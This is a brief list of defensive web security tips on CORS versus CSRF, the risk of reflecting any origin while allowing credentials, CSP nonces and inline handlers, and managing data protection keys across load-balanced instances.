  • CORS only relaxes the same-origin policy; a cross-origin form post still executes, so CORS is no CSRF defence.
  • Reflecting any origin while allowing credentials is the CORS misconfiguration that actually leaks data.
  • When a nonce or hash is present, supporting browsers ignore 'unsafe-inline' — it survives only as a fallback for old browsers.
  • Inline event handlers cannot carry a nonce; move them into script files before enforcing a strict CSP.
  • Sticky sessions hide unshared data protection keys until an instance is replaced, and deleting keys logs everyone out — revoke instead.
